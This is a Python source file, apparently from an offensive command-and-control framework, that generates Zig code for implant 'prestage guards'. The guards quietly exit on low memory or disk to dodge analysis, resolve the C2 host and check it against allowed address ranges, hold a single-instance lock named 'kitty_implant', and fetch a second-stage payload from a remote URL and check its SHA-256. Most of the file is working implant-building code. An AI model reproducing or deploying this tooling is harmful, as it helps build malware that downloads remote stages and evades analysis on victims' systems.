#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Zig bootstrap builders for offline prestage guard modules."""

from __future__ import annotations

import ipaddress
from typing import List, Optional

from core.payload_generation.prestage.emitters.zig import _split_helpers_body
from lib.c2.prestage_guards import Prestage_guards


class Prestage_guards_zig(Prestage_guards):
    """Zig emitters for guard prestages — inherits scope/lock helpers from ``Prestage_guards``."""

    @staticmethod
    def escape_zig_string(value: str) -> str:
        return str(value or "").replace("\\", "\\\\").replace('"', '\\"')

    @classmethod
    def zig_ipv4_cidr_rules(cls, cidrs: List[str]) -> str:
        rules: List[str] = []
        for raw in cidrs:
            try:
                net = ipaddress.ip_network(str(raw).strip(), strict=False)
            except ValueError:
                continue
            if net.version != 4:
                continue
            addr = int(net.network_address)
            rules.append(f"    .{{ .net = 0x{addr:08x}, .bits = {net.prefixlen} }},")
        if not rules:
            return "&[_]struct {{ net: u32, bits: u5 }}{};"
        body = "\n".join(rules)
        return f"&[_]struct {{ net: u32, bits: u5 }}{{\n{body}\n}}"

    @classmethod
    def zig_host_array(cls, hosts: List[str]) -> str:
        cleaned = [str(h).strip() for h in hosts if str(h).strip()]
        if not cleaned:
            return "const _kitty_scope_extra_hosts = [_][]const u8{};"
        lines = ",\n".join(f'        "{cls.escape_zig_string(h)}"' for h in cleaned)
        return f"const _kitty_scope_extra_hosts = [_][]const u8{{\n{lines},\n    }};"

    @classmethod
    def build_resource_guard_zig(cls, *, min_mem_mb: int = 32, min_disk_mb: int = 10) -> str:
        helpers = """
fn kittyProbeMemMb() u64 {
    if (builtin.os.tag == .linux) {
        const f = std.fs.cwd().openFile("/proc/meminfo", .{}) catch return 0;
        defer f.close();
        var buf: [512]u8 = undefined;
        while (true) {
            const line = f.reader().readUntilDelimiterOrEof(&buf, '\\n') catch return 0;
            if (line) |l| {
                if (std.mem.startsWith(u8, l, "MemTotal:")) {
                    var it = std.mem.tokenizeAny(u8, l, " \\t");
                    _ = it.next();
                    const token = it.next() orelse return 0;
                    const kib = std.fmt.parseInt(u64, token, 10) catch return 0;
                    return kib / 1024;
                }
            } else break;
        }
    }
    return 0;
}

fn kittyProbeDiskFreeMb() u64 {
    const space = std.fs.cwd().getDiskSpace(".") catch return 0;
    return space.available / (1024 * 1024);
}
""".strip()
        body = f"""
{{
    const alloc = std.heap.page_allocator;
    const min_mem: u64 = {int(min_mem_mb)};
    const min_disk: u64 = {int(min_disk_mb)};
    const mem_mb = kittyProbeMemMb();
    const disk_mb = kittyProbeDiskFreeMb();
    if (mem_mb > 0 and mem_mb < min_mem) {{
        const detail = std.fmt.allocPrint(alloc, "{{d}}", .{{mem_mb}}) catch "low_memory";
        defer alloc.free(detail);
        kittyTelemetryRecord("resource_guard", "low_memory", detail);
        std.process.exit(0);
    }}
    if (disk_mb > 0 and disk_mb < min_disk) {{
        const detail = std.fmt.allocPrint(alloc, "{{d}}", .{{disk_mb}}) catch "low_disk";
        defer alloc.free(detail);
        kittyTelemetryRecord("resource_guard", "low_disk", detail);
        std.process.exit(0);
    }}
}}
""".strip()
        return _split_helpers_body(helpers, body)

    @classmethod
    def build_scope_guard_zig(
        cls,
        *,
        c2_host: str = "",
        allowed_hosts: Optional[List[str]] = None,
        allowed_cidrs: Optional[List[str]] = None,
    ) -> str:
        host = cls.escape_zig_string(c2_host)
        hosts = list(allowed_hosts or [])
        cidrs = list(allowed_cidrs or list(cls.DEFAULT_PRIVATE_CIDRS))
        extra_cidrs = cls.zig_ipv4_cidr_rules(cidrs)
        host_arr = cls.zig_host_array(hosts)

        helpers = f"""
fn kittyIpv4ToU32(addr: [4]u8) u32 {{
    return std.mem.readInt(u32, &addr, .big);
}}

fn kittyIpv4InCidr(addr: u32, rule: struct {{ net: u32, bits: u5 }}) bool {{
    if (rule.bits >= 32) return addr == rule.net;
    const mask: u32 = (~@as(u32, 0)) << @intCast(32 - rule.bits);
    return (addr & mask) == (rule.net & mask);
}}

fn kittyScopeIpv4Allowed(addr: u32) bool {{
    const extra = {extra_cidrs};
    for (extra) |rule| {{
        if (kittyIpv4InCidr(addr, rule)) return true;
    }}
    return false;
}}

fn kittyScopeHostAllowed(host: []const u8) bool {{
    for (_kitty_scope_extra_hosts) |allowed| {{
        if (std.mem.eql(u8, host, allowed)) return true;
    }}
    const resolved = std.net.Address.resolveIp(host, 0) catch return false;
    switch (resolved.in) {{
        .ipv4 => |ipv4| return kittyScopeIpv4Allowed(kittyIpv4ToU32(ipv4.addr)),
        else => return false,
    }}
}}

{host_arr}
""".strip()

        if not c2_host:
            return "// scope_guard: set lhost on payload"

        body = f"""
if (!kittyScopeHostAllowed("{host}")) {{
    kittyTelemetryRecord("scope_guard", "blocked", "{host}");
    std.process.exit(0);
}}
""".strip()
        return _split_helpers_body(helpers, body)

    @classmethod
    def build_stage_verify_zig(cls, *, stage_url: str = "", stage_sha256: str = "") -> str:
        url = cls.escape_zig_string(stage_url)
        sha = cls.escape_zig_string(stage_sha256.lower())
        if not stage_url and not stage_sha256:
            return "// stage_verify: no stage_url/sha256 configured"

        helpers = """
fn kittySha256Hex(alloc: mem.Allocator, data: []const u8) ![]const u8 {
    var digest: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(data, &digest, .{});
    const hex = try alloc.alloc(u8, digest.len * 2);
    const alphabet = "0123456789abcdef";
    for (digest, 0..) |byte, i| {
        hex[i * 2] = alphabet[byte >> 4];
        hex[i * 2 + 1] = alphabet[byte & 0x0f];
    }
    return hex;
}

fn kittyStageFetch(alloc: mem.Allocator, url: []const u8) ![]u8 {
    var client = std.http.Client{ .allocator = alloc };
    defer client.deinit();
    var aw: std.Io.Writer.Allocating = .init(alloc);
    defer aw.deinit();
    _ = try client.fetch(.{
        .location = .{ .url = url },
        .method = .GET,
        .response_writer = &aw.writer,
        .keep_alive = false,
    });
    return try aw.toOwnedSlice();
}
""".strip()

        body = f"""
{{
    const alloc = std.heap.page_allocator;
    const stage_url = "{url}";
    const expected_sha = "{sha}";
    var payload: []const u8 = "";
    var owned_payload: ?[]u8 = null;
    defer if (owned_payload) |buf| alloc.free(buf);
    if (stage_url.len > 0) {{
        owned_payload = kittyStageFetch(alloc, stage_url) catch |err| {{
            kittyTelemetryRecord("stage_verify", "failed", @errorName(err));
            return;
        }};
        payload = owned_payload.?;
    }}
    if (expected_sha.len > 0) {{
        const digest = kittySha256Hex(alloc, payload) catch |err| {{
            kittyTelemetryRecord("stage_verify", "failed", @errorName(err));
            return;
        }};
        defer alloc.free(digest);
        if (!std.mem.eql(u8, digest, expected_sha)) {{
            kittyTelemetryRecord("stage_verify", "failed", "sha256_mismatch");
            std.process.exit(1);
        }}
    }}
}}
""".strip()
        return _split_helpers_body(helpers, body)

    @classmethod
    def build_dns_preflight_zig(cls, *, c2_host: str = "") -> str:
        host = cls.escape_zig_string(c2_host)
        if not c2_host:
            return "// dns_preflight: set lhost on payload"
        body = f"""
_ = std.net.Address.resolveIp("{host}", 0) catch |err| {{
    kittyTelemetryRecord("dns_preflight", "failed", @errorName(err));
    std.process.exit(0);
}};
""".strip()
        return body

    @classmethod
    def build_single_instance_zig(cls, *, lock_id: str = "kitty_implant") -> str:
        safe = cls.safe_lock_token(lock_id)
        lock_lit = cls.escape_zig_string(safe)
        helpers = """
fn kittySingleInstancePath(alloc: mem.Allocator, lock_id: []const u8) ![]const u8 {
    const base = std.process.getEnvVarOwned(alloc, "TMPDIR") catch
        std.process.getEnvVarOwned(alloc, "TEMP") catch
        std.process.getEnvVarOwned(alloc, "TMP") catch
        try alloc.dupe(u8, "/tmp");
    defer alloc.free(base);
    return std.fmt.allocPrint(alloc, "{s}/.kitty_run_{s}.lock", .{ base, lock_id });
}
""".strip()
        body = f"""
{{
    const alloc = std.heap.page_allocator;
    const path = kittySingleInstancePath(alloc, "{lock_lit}") catch return;
    defer alloc.free(path);
    _ = std.fs.cwd().createFile(path, .{{ .exclusive = true, .read = true }}) catch |err| switch (err) {{
        error.PathAlreadyExists => {{
            kittyTelemetryRecord("single_instance", "already_running", path);
            std.process.exit(0);
        }},
        else => return,
    }};
}}
""".strip()
        return _split_helpers_body(helpers, body)


build_resource_guard_zig = Prestage_guards_zig.build_resource_guard_zig
build_scope_guard_zig = Prestage_guards_zig.build_scope_guard_zig
build_stage_verify_zig = Prestage_guards_zig.build_stage_verify_zig
build_dns_preflight_zig = Prestage_guards_zig.build_dns_preflight_zig
build_single_instance_zig = Prestage_guards_zig.build_single_instance_zig